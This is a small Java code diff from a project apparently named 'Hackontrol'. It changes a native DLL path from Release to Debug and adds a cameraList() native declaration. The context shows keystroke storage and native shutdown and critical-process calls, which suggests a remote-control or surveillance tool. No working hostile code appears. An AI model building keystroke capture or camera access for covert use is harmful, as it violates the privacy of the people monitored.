@@ -28,7 +28,7 @@ public class NativeLibrary {
 			Errors.printStackTrace();
 		}*/
 
-		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Release\\Native Library.dll");
+		System.load("D:\\GitHub Repository\\Hackontrol\\Hackontrol\\x64\\Debug\\Native Library.dll");
 		KEYSTROKE_LIST = new ArrayList<>();
 		KEYSTROKE_MAP = new HashMap<>();
 		NativeLibrary.Block = false;
@@ -41,6 +41,7 @@ public class NativeLibrary {
 	public static native String shutdown();
 	public static native boolean critical(boolean critical);
 	public static native int dialog(String title, String content, int flags);
+	public static native Object cameraList();
 
 	public static void load() {
 		// Load the class
